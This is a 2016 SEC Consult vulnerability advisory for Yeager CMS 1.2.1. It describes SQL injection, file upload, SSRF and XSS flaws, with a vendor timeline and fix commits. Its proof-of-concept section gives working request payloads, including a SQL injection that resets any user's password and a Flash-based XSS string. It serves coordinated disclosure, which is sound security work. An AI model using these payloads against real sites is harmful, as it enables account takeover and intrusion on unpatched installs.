@@ -1,0 +1,184 @@
+SEC Consult Vulnerability Lab Security Advisory < 20160210-0 >
+=======================================================================
+              title: Multiple Vulnerabilities
+            product: Yeager CMS
+ vulnerable version: 1.2.1
+      fixed version: 1.3
+         CVE number: CVE-2015-7567, CVE-2015-7568, CVE-2015-7569, CVE-2015-7570
+,
+                     CVE-2015-7571, CVE-2015-7572
+             impact: Critical
+           homepage: http://yeager.cm/en/home/
+              found: 2015-11-18
+                 by: P. Morimoto (Office Bangkok)
+                     SEC Consult Vulnerability Lab
+
+                     An integrated part of SEC Consult
+                     Bangkok - Berlin - Frankfurt/Main - Montreal - Moscow
+                     Singapore - Vienna (HQ) - Vilnius - Zurich
+
+                     https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+Yeager is an open source CMS that aims to become the most cost/time-effective
+solution for medium and large web sites and applications.
+
+
+Business recommendation:
+------------------------
+Yeager CMS suffers from multiple vulnerabilities due to improper input
+validation and unprotected test scripts. By exploiting these vulnerabilities
+an attacker could:
+    1. Change user's passwords including the administrator's account.
+    2. Gain full access to the Yeager CMS database.
+    3. Determine internal servers that inaccessible from the Internet.
+    4. Attack other users of the Yeager CMS with Cross-Site Scripting.
+
+SEC Consult recommends not to use this software until a thorough security
+review has been performed by security professionals and all identified
+issues have been resolved.
+
+Vulnerability overview/description:
+-----------------------------------
+1. Unauthenticated Blind SQL Injection (CVE-2015-7567, CVE-2015-7568)
+2. Post-authentication Blind SQL Injection (CVE-2015-7569)
+3. Unauthenticated Arbitrary File Upload (CVE-2015-7571)
+4. Unauthenticated Server-side Request Forgery (CVE-2015-7570)
+5. Non-permanent Cross-site Scripting (CVE-2015-7572)
+
+
+Proof of concept:
+-----------------
+1. Unauthenticated Blind SQL Injection (CVE-2015-7567, CVE-2015-7568)
+http://<host>/yeager/?action=passwordreset&token=<SQL Injection>
+http://<host>/yeager/y.php/responder?handler=setNewPassword&us=sess_20000&lh=70
+&data=["noevent",{"yg_property":"setNewPassword","params":{"userToken":"<SQL
+Injection>"}}]
+
+The vulnerability can also be used for unauthorized reset password of any user.
+In order to reset a specific user's password, an attacker will need to provide
+a valid email address of the user that he wants to attack.
+The email can be retrieved by either social engineering or using the
+aforementioned unauthenticated SQL injection vulnerability.
+
+http://<host>/yeager/y.php/responder?handler=recoverLogin&us=sess_20000&lh=70&d
+ata=["noevent",{"yg_property":"recoverLogin","params":{"userEmail":"<victim@ema
+il.com>","winID":"1"}}]
+
+The above URL just simply creates and sends a reset password token to the
+user's email. Next, even if attacker does not know the token,
+manipulating SQL commands allows to force to set the new password instantly.
+
+Note that new password MUST be at least 8 characters in length
+and must contain both letters and numbers.
+
+http://<host>/yeager/y.php/responder?handler=setNewPassword&us=sess_20000&lh=70
+&data=["noevent",{"yg_property":"setNewPassword","params":{"userToken":"'+or+ui
+d=(select+id+from+yg_user+where+login='<victim@email.com>')+limit+1--+-","userP
+assword":"<new-password>","winID":"1"}}]
+
+2. Post-authentication Blind SQL Injection (CVE-2015-7569)
+http://<host>/yeager/y.php/tab_USERLIST
+POST Data:
+win_no=4&yg_id=2-user&yg_type=user&wid=wid_4&refresh=1&initload=&us=sess_16000&
+lh=325&pagedir_page=2&pagedir_perpage=1&pagedir_orderby=<SQL
+Injection>&pagedir_orderdir=4&pagedir_from=5&pagedir_limit=6,7&newRole=1
+
+3. Unauthenticated Arbitrary File Upload (CVE-2015-7571)
+A publicly known Arbitrary File Upload vulnerability of Plupload was found in
+Yeager CMS.
+Fortunately, to successfully exploit the vulnerability requires PHP directive
+"upload_tmp_dir" set to an existing directory and it must contain the writable
+directory "plupload".
+
+By default, the PHP directive "upload_tmp_dir" is an empty value.
+As a result, the script will attempt to upload a file to /plupload/ instead
+which generally does not exist on the filesystem.
+
+http://<host>/yeager/ui/js/3rd/plupload/examples/upload.php
+
+4. Unauthenticated Server-side Request Forgery (CVE-2015-7570)
+http://<host>/yeager/libs/org/adodb_lite/tests/test_adodb_lite.php
+http://<host>/yeager/libs/org/adodb_lite/tests/test_datadictionary.php
+http://<host>/yeager/libs/org/adodb_lite/tests/test_adodb_lite_sessions.php
+
+The parameter "dbhost" can be used to perform internal port scan using
+time delay measurement. An attacker can provide internal IP address
+and port number, for example, 10.10.0.1:22. The attacker then compares
+time delays from multiple responses in order to determine host
+and port availability.
+
+5. Non-permanent Cross-site Scripting (CVE-2015-7572)
+A previously published XSS vulnerability of Plupload was found in Yeager CMS.
+http://<host>/yeager/ui/js/3rd/plupload/js/plupload.flash.swf?id=\%22%29%29;}ca
+tch%28e%29{alert%28/XSS/%29;}//
+
+
+Vulnerable / tested versions:
+-----------------------------
+The vulnerabilities have been tested on Yeager CMS 1.2.1
+
+URL: http://yeager.cm/en/download/package/?v=1.2.1.0.0
+
+
+Vendor contact timeline:
+------------------------
+2015-12-07: Contacting vendor through office@nexttuesday.de, contact@yeager.cm
+2015-12-07: Established secure communication channel
+2015-12-07: Sending advisory draft
+2015-12-10: Yeager CMS 1.2.2 released for security fixes
+2015-12-22: Yeager CMS 1.3 released for security fixes
+2016-02-10: Public advisory release
+
+Solution:
+---------
+The vulnerability has been fixed in Yeager CMS 1.3 and later.
+
+https://github.com/ygcm/yeager/commit/74e0ce518321e659cda54f3f565ca0ce8794dba8#
+diff-4200a6e704ae66ada32f35f69796cc71
+https://github.com/ygcm/yeager/commit/053a3b98a9a3f4fd94186cbb8994de0a3e8d9307
+
+Workaround:
+-----------
+No workaround available.
+
+
+Advisory URL:
+-------------
+https://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+SEC Consult Vulnerability Lab
+
+SEC Consult
+Bangkok - Berlin - Frankfurt/Main - Montreal - Moscow
+Singapore - Vienna (HQ) - Vilnius - Zurich
+
+About SEC Consult Vulnerability Lab
+The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It
+ensures the continued knowledge gain of SEC Consult in the field of network
+and application security to stay ahead of the attacker. The SEC Consult
+Vulnerability Lab supports high-quality penetration testing and the evaluation
+of new offensive and defensive technologies for our customers. Hence our
+customers obtain the most current information about vulnerabilities and valid
+recommendation about the risk profile of new technologies.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Interested to work with the experts of SEC Consult?
+Send us your application https://www.sec-consult.com/en/Career.htm
+
+Interested in improving your cyber security with the experts of SEC Consult?
+Contact our local offices https://www.sec-consult.com/en/About/Contact.htm
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Mail: research at sec-consult dot com
+Web: https://www.sec-consult.com
+Blog: http://blog.sec-consult.com
+Twitter: https://twitter.com/sec_consult
+
+EOF Pichaya Morimoto / @2015
